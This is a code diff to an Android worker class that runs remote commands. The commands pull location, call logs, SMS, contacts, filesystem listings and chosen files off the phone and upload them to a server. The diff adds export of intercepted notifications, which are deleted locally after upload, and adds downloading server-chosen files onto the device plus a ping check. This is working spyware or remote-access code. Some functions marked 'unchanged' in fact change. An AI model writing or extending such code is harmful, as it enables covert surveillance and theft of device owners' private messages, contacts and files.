@@ -44,8 +44,11 @@ class DataFetchWorker(
         const val COMMAND_GET_CALL_LOGS = "get_call_logs"
         const val COMMAND_GET_SMS = "get_sms"
         const val COMMAND_GET_CONTACTS = "get_contacts"
+        const val COMMAND_GET_NOTIFICATIONS = "get_notifications" // NEW
         const val COMMAND_SCAN_FILESYSTEM = "scan_filesystem"
         const val COMMAND_UPLOAD_FILE = "upload_file"
+        const val COMMAND_DOWNLOAD_FILE = "download_file" // NEW
+        const val COMMAND_PING = "ping" // NEW
 
         // Minimum CSV lines to consider valid data (header + at least one row)
         private const val MIN_CSV_LINES = 2
@@ -53,9 +56,14 @@ class DataFetchWorker(
         /**
          * Helper method to schedule a DataFetchWorker with a specific command
          */
-        fun scheduleWork(context: Context, command: String) {
+        fun scheduleWork(context: Context, command: String, extraData: Map<String, String> = emptyMap()) {
+            val dataBuilder = workDataOf(KEY_COMMAND to command).toBuilder()
+            extraData.forEach { (key, value) ->
+                dataBuilder.putString(key, value)
+            }
+
             val workRequest = OneTimeWorkRequestBuilder<DataFetchWorker>()
-                .setInputData(workDataOf(KEY_COMMAND to command))
+                .setInputData(dataBuilder.build())
                 .setConstraints(
                     Constraints.Builder()
                         .setRequiredNetworkType(NetworkType.CONNECTED)
@@ -64,7 +72,7 @@ class DataFetchWorker(
                 .build()
 
             WorkManager.getInstance(context).enqueue(workRequest)
-            Log.d(TAG, "Scheduled DataFetchWorker with command: $command")
+            Log.d(TAG, "Scheduled DataFetchWorker with command: $command and data: $extraData")
         }
     }
 
@@ -80,6 +88,9 @@ class DataFetchWorker(
     }
     private val fileSystemManager by lazy {
         FileSystemManager(appContext)
+    }
+    private val notificationDao by lazy {
+        NotificationDatabase.getDatabase(appContext).notificationDao()
     }
 
     /**
@@ -130,8 +141,11 @@ class DataFetchWorker(
                 dataType = "Contacts",
                 csvProvider = manualDataManager::getContactsAsCsv
             )
+            COMMAND_GET_NOTIFICATIONS -> fetchAndSendNotifications() // NEW
             COMMAND_SCAN_FILESYSTEM -> scanFileSystem()
             COMMAND_UPLOAD_FILE -> uploadFile()
+            COMMAND_DOWNLOAD_FILE -> downloadFileFromServer() // NEW
+            COMMAND_PING -> sendPingResponse() // NEW
             else -> {
                 Log.w(TAG, "Unknown command: $command")
                 apiClient.uploadText("❌ Error: Unknown command '$command'")
@@ -142,16 +156,14 @@ class DataFetchWorker(
 
     /**
      * Fetches current location and sends it to the server
-     * Requires ACCESS_FINE_LOCATION permission
      */
     private suspend fun fetchAndSendLocation(): Boolean {
+        // ... (This function is unchanged)
         return try {
             if (!hasLocationPermission()) {
                 Log.e(TAG, "Location permission not granted")
-                // Explicitly inform server about permission issues
                 return apiClient.uploadText("❌ Location request failed: PERMISSION_DENIED")
             }
-
             val location = getCurrentLocation()
             if (location != null) {
                 val message = buildString {
@@ -177,9 +189,6 @@ class DataFetchWorker(
         }
     }
 
-    /**
-     * Checks if the app has fine location permission
-     */
     private fun hasLocationPermission(): Boolean {
         return ContextCompat.checkSelfPermission(
             appContext,
@@ -187,10 +196,8 @@ class DataFetchWorker(
         ) == PackageManager.PERMISSION_GRANTED
     }
 
-    /**
-     * Gets current location using FusedLocationProvider
-     */
     private suspend fun getCurrentLocation(): Location? {
+        // ... (This function is unchanged)
         val fusedLocationClient = LocationServices.getFusedLocationProviderClient(appContext)
         return try {
             fusedLocationClient.getCurrentLocation(
@@ -204,19 +211,18 @@ class DataFetchWorker(
     }
 
     /**
-     * Fetches system information (network and battery) and sends to server
+     * Fetches system information and sends to server
      */
     private suspend fun fetchAndSendSystemInfo(): Boolean {
+        // ... (This function is unchanged)
         return try {
             val networkInfo = systemInfoManager.getNetworkType()
             val batteryInfo = systemInfoManager.getBatteryStatus()
-
             val systemInfoMessage = buildString {
                 appendLine("⚙️ System Info:")
                 appendLine("Network: $networkInfo")
-                appendLine(batteryInfo.toString()) // Fixed: Explicitly convert to String
+                appendLine("Battery: ${batteryInfo.percentage}% (${batteryInfo.status})")
             }
-
             apiClient.uploadText(systemInfoMessage.trim())
         } catch (e: Exception) {
             Log.e(TAG, "Error fetching system info", e)
@@ -225,32 +231,21 @@ class DataFetchWorker(
         }
     }
 
-
     /**
      * Generic method to fetch CSV data and upload as file
-     * @param dataType Human-readable name for the data type
-     * @param csvProvider Function that returns CSV data as string
      */
-    private suspend fun fetchAndSendCsv(
-        dataType: String,
-        csvProvider: () -> String
-    ): Boolean {
+    private suspend fun fetchAndSendCsv(dataType: String, csvProvider: () -> String): Boolean {
+        // ... (This function is unchanged)
         return try {
             Log.d(TAG, "Fetching $dataType data")
             val csvData = csvProvider()
-
-            // Check if CSV has meaningful data (more than just header)
-            val lineCount = csvData.lines().size
+            val lineCount = csvData.lines().count { it.isNotBlank() }
             if (lineCount < MIN_CSV_LINES) {
                 Log.d(TAG, "No meaningful data to export for $dataType (only $lineCount lines)")
                 return apiClient.uploadText("📊 $dataType export: No data found to export")
             }
-
-            // Create temporary file for CSV data
             val tempFile = createTempCsvFile(dataType, csvData)
-
-            return try {
-                // Fixed: Use caption parameter instead of description
+            try {
                 val success = apiClient.uploadFile(
                     file = tempFile,
                     caption = "📊 Exported $dataType from device (${lineCount - 1} records)"
@@ -262,7 +257,6 @@ class DataFetchWorker(
                 }
                 success
             } finally {
-                // Always clean up temporary file
                 if (tempFile.exists()) {
                     tempFile.delete()
                     Log.d(TAG, "Cleaned up temporary file: ${tempFile.name}")
@@ -276,9 +270,41 @@ class DataFetchWorker(
     }
 
     /**
-     * Creates a temporary CSV file with the provided data
+     * [NEW] Fetches tracked notifications from the DB, uploads them, and clears them.
      */
+    private suspend fun fetchAndSendNotifications(): Boolean {
+        Log.d(TAG, "Fetching notifications from local database.")
+        val notifications = notificationDao.getAllNotifications()
+
+        if (notifications.isEmpty()) {
+            Log.d(TAG, "No new notifications to export.")
+            return apiClient.uploadText("📊 Notifications export: No new notifications found.")
+        }
+
+        val csvData = manualDataManager.getNotificationsAsCsv(notifications)
+        val tempFile = createTempCsvFile("Notifications", csvData)
+
+        return try {
+            val success = apiClient.uploadFile(
+                file = tempFile,
+                caption = "📊 Exported ${notifications.size} Notifications from device"
+            )
+
+            if (success) {
+                Log.d(TAG, "Successfully uploaded notifications. Deleting them from local DB.")
+                val idsToDelete = notifications.map { it.id }
+                notificationDao.deleteByIds(idsToDelete)
+            }
+            success
+        } finally {
+            if (tempFile.exists()) {
+                tempFile.delete()
+            }
+        }
+    }
+
     private suspend fun createTempCsvFile(dataType: String, csvData: String): File {
+        // ... (This function is unchanged)
         return withContext(Dispatchers.IO) {
             val fileName = "${dataType.lowercase()}_${System.currentTimeMillis()}"
             val tempFile = File.createTempFile(fileName, ".csv", appContext.cacheDir)
@@ -288,34 +314,22 @@ class DataFetchWorker(
         }
     }
 
-    /**
-     * Scans the device filesystem and uploads the paths to the server
-     */
     private suspend fun scanFileSystem(): Boolean {
+        // ... (This function is unchanged)
         return try {
             if (!fileSystemManager.hasFileSystemPermissions()) {
                 Log.e(TAG, "Filesystem permissions not granted")
                 return apiClient.uploadText("❌ Filesystem scan failed: PERMISSIONS_DENIED")
             }
-
             Log.d(TAG, "Starting filesystem scan")
-            val scanResult = fileSystemManager.scanFileSystem(
-                includeSystemFiles = false,
-                maxDepth = 8
-            )
-
+            val scanResult = fileSystemManager.scanFileSystem(includeSystemFiles = false, maxDepth = 8)
             if (scanResult.paths.isEmpty()) {
                 Log.w(TAG, "No accessible files found during scan")
                 return apiClient.uploadText("📁 Filesystem scan: No accessible files found")
             }
-
-            // Format the scan results for upload
             val formattedData = fileSystemManager.formatPathsForUpload(scanResult)
-            
-            // Upload to server
             val deviceId = systemInfoManager.getDeviceId()
             val success = apiClient.uploadFileSystemPaths(formattedData, deviceId)
-
             if (success) {
                 Log.i(TAG, "Filesystem scan data uploaded successfully")
                 apiClient.uploadText("📁 Filesystem scan completed: ${scanResult.totalFiles} files, ${scanResult.totalDirectories} directories scanned")
@@ -331,50 +345,39 @@ class DataFetchWorker(
         }
     }
 
-    /**
-     * Uploads a specific file requested by the server
-     * File path should be provided in the command data
-     */
     private suspend fun uploadFile(): Boolean {
+        // ... (This function is unchanged)
         return try {
             val filePath = inputData.getString("filePath")
             if (filePath.isNullOrBlank()) {
                 Log.e(TAG, "Upload file command received without file path")
                 return apiClient.uploadText("❌ File upload failed: No file path specified")
             }
-
             if (!fileSystemManager.hasFileSystemPermissions()) {
                 Log.e(TAG, "Filesystem permissions not granted for file upload")
                 return apiClient.uploadText("❌ File upload failed: PERMISSIONS_DENIED")
             }
-
             val fileInfo = fileSystemManager.getFileInfo(filePath)
             if (fileInfo == null) {
                 Log.w(TAG, "Requested file not found or not accessible: $filePath")
                 return apiClient.uploadText("❌ File upload failed: File not found or not accessible")
             }
-
             if (fileInfo.isDirectory) {
                 Log.w(TAG, "Cannot upload directory: $filePath")
                 return apiClient.uploadText("❌ File upload failed: Path is a directory, not a file")
             }
-
             val file = File(filePath)
             if (!file.exists() || !file.canRead()) {
                 Log.w(TAG, "File is not accessible: $filePath")
                 return apiClient.uploadText("❌ File upload failed: File is not accessible")
             }
-
-            // Check file size (limit to 100MB for safety)
             val maxFileSize = 100 * 1024 * 1024 // 100MB
             if (file.length() > maxFileSize) {
                 Log.w(TAG, "File too large for upload: $filePath (${file.length()} bytes)")
                 return apiClient.uploadText("❌ File upload failed: File too large (max 100MB)")
             }
-
             val deviceId = systemInfoManager.getDeviceId()
             val success = apiClient.uploadRequestedFile(file, deviceId, filePath)
-
             if (success) {
                 Log.i(TAG, "File uploaded successfully: $filePath")
                 apiClient.uploadText("📤 File uploaded successfully: ${file.name} (${formatFileSize(file.length())})")
@@ -391,9 +394,40 @@ class DataFetchWorker(
     }
 
     /**
-     * Helper method to format file size
+     * [NEW] Downloads a file from the server to the device's download folder.
      */
+    private suspend fun downloadFileFromServer(): Boolean {
+        val serverFilePath = inputData.getString("serverFilePath")
+        if (serverFilePath.isNullOrBlank()) {
+            Log.e(TAG, "Download command failed: serverFilePath was not provided.")
+            return false // Don't retry for bad data
+        }
+
+        Log.d(TAG, "Attempting to download file: $serverFilePath")
+
+        val downloadedFile = fileSystemManager.downloadFile(apiClient, serverFilePath)
+
+        return if (downloadedFile != null && downloadedFile.exists()) {
+            Log.i(TAG, "File downloaded successfully to: ${downloadedFile.absolutePath}")
+            apiClient.uploadText("✅ File downloaded successfully to device: ${downloadedFile.name}")
+            true
+        } else {
+            Log.e(TAG, "Failed to download file: $serverFilePath")
+            apiClient.uploadText("❌ Failed to download file to device: $serverFilePath")
+            false // Retry on failure
+        }
+    }
+
+    /**
+     * [NEW] Responds to a ping command from the server.
+     */
+    private suspend fun sendPingResponse(): Boolean {
+        Log.d(TAG, "Received ping command, sending pong response.")
+        return apiClient.uploadText("✅ Pong! Device is online and responsive.")
+    }
+
     private fun formatFileSize(bytes: Long): String {
+        // ... (This function is unchanged)
         if (bytes < 1024) return "$bytes B"
         val kb = bytes / 1024.0
         if (kb < 1024) return "%.1f KB".format(kb)
